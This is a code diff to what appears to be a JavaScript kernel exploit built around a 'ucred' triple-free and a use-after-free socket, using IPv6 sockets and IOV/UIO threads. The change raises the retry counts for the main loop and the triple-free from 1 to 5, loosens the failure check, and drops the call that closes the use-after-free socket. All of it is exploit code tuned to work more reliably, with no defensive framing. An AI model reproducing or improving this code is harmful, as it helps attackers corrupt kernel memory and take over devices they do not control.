@@ -117,8 +117,8 @@ var MSG_IOV_NUM = 0x17; // 23
 var IPV6_SOCK_NUM = 8;
 var IOV_THREAD_NUM = 4;
 var UIO_THREAD_NUM = 4;
-var MAIN_LOOP_ITERATIONS = 1;
-var TRIPLEFREE_ITERATIONS = 1;
+var MAIN_LOOP_ITERATIONS = 5;
+var TRIPLEFREE_ITERATIONS = 5;
 var MAX_ROUNDS_TWIN = 4;
 var MAX_ROUNDS_TRIPLET = 40;
 var MAIN_CORE = 4;
@@ -1410,16 +1410,14 @@ function trigger_ucred_triplefree() {
 
   } // END WHILE
 
-  if (main_count === TRIPLEFREE_ITERATIONS) {
+  if (main_count >= TRIPLEFREE_ITERATIONS) {
     send_notification("[END] Max iterations reached → FAIL");
     return false;
   }
 
-  if (uaf_socket !== -1) {
-    close(new BigInt(uaf_socket));
-  }
   send_notification("[END] Flow completed → SUCCESS");
   return true;
+
 }
 
 
